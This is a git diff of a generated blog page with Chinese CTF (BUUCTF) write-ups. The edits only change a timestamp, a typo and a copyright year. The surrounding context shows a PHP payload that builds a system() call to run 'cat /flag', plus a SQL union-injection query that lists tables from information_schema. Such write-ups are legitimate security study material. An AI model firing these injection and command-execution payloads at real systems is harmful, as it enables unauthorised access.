@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000510021.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000241825.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128175030199.png">
-<meta property="og:updated_time" content="2020-11-29T06:52:54.702Z">
+<meta property="og:updated_time" content="2021-01-25T14:57:42.634Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF2">
 <meta name="twitter:description" content="[SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&amp;#41;`$&amp;#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将">
@@ -291,7 +291,7 @@
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;;$pi=$$pi;$pi&amp;#123;0&amp;#125;&amp;#40;$pi&amp;#123;1&amp;#125;&amp;#41;&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure>
 
-<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>随便点点发现一个接口，疑似sql注入，试了一下果然是联合注入，扫荡以下表名</p>
+<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>随便点点发现一个接口，疑似sql注入，试了一下果然是联合注入，扫荡一下表名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;table_name&amp;#41; from information_schema.tables where table_schema=database&amp;#40;&amp;#41;&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806</span><br></pre></td></tr></table></figure>
 
 <p>没发现可以的表，扫荡一下库名</p>
@@ -573,7 +573,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 Ycj
+    		&copy; 2021 Ycj
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
